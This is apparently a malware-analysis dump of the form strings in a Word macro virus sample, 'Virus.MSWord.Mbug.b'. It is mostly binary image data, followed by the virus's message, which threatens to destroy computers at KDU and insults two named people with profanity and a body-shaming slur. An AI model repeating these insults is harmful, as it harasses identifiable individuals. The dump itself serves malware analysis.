VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ˈ���q_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sr�^d�(�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!��=2��d��8G?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�ȘKF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��r-ad�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�<�l�T���-����\�jAH+u�IѠ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�L%1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>J�����5}�II�D���X&�I�]"��d�$q4KWz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l'-{y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{Γ���&:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LJ�� /h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�s��d�)��J�R*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
դ�LiQiNq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i����U����
JWw��T�.}i���Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4<+�bW�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SBBTLM��<+�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`%�94��f��t�i�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�HqaC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3jܘ�"F� C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�ɓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�\ɒ�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZlIs�̛2]ά��ǟ@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K�:�*M�ShҥDs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#ԫU�b�ZT%ׯ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ju,֠h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��۷p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V#C�x�ҭK�n޿p���w�E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"7t�Pra���&f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]Ν
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L~\6��ɠ-{��ti�A��)��k�km{�ǐ�n߾);5�Owo~ȑ_L��/А^W�6�<��掅���y������_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=���8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�۟��G���0n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��~W��ywRa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i}9�R�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`Z�)��|.�W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۆ�	7���1xav摧!y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(��u7�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vH!��	8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8#}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:���T*��c����\GHZؒ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4f��zM:�Ж��wV�����x�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ee�5&bT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8t�i'�݅�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�9eIs�)蠂�Y۞
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i㍐
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�k�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}"�S�\ZF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�{��瀜
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E詄*h������d��=�ꬫ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(db���v}
馜�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��v��U݊�w��j��B+,h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�Z�lm��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k��R�k��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:*��9k���F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���YVk����^��
K�
r�킲ދ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7K����ژ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,j��n�eġ9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$ߩ*Ŵ�*�߂\�~#;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m�ڲ�3����3�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M"�����:[-���
\+baKK,w�b]Yk8���2�u��6��ګ�WN{��0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��7��ܫEY"���(_��
��KQ�)��w�t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ly�D2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�]�w*�%�����v��E*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/�:6�m�fFD��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g��D��}[m3k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k� B� �Q3����%U���G�åe�v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�=��;��з
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e���Y]�k���?i�#���u8D��sV3ҟ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7ߑ�C	T]�|Ĭ��*���x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t໼5��mЃ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
32c��n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
��˩)h�}�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�k�a�p�3�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�����!1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'&�+.b"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aw�	iE�<�^���'/��>�:��Heƌ�OI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��7�1,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G+^�`>t 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�uF���b�HǲG�l���$$#	�
n��]!%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jb����"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Pv�8��cW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^
pMĹ�.��Kb
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�T�@IFK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@��ye/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��Yē�D_]\i�Z~쐪�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3���O�I�g��ҝ�D�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$i:ӗ|��1uIO|�r��4�>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Df2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p*�Y�&;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Olvo�)˦$�)�l>�Qٌ�<-jɏ�q��D�5����瀨d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R��T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���H���T@5��nC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�JD�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E :3zNQ#���%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�jT�y(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��This GIF file was assembled with GIF Construction Set from:

Alchemy Mindworks Inc.
P.O. Box 500
Beeton, Ontario
L0G 1A0
CANADA.

This comment block will not appear in files created with a registered version of GIF Construction Set
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIFCONnb1.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ROBOT1.BMP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ROBOT2.BMP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yeah, I'm naughty Robot from KDU Penang.  I  �K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�want to destroy all the computer in KDU....Kill
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pc is my job.  Especially the big fat women in 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�in KDU sibu "WENDY TEO" and the other oneen �!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�is lousy lecturer "FRANKIE CHIENG".  Fucken ? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�then two asshole!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fuck Wendy TeoI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fuck Frankie Chieng
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Mbug.b' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
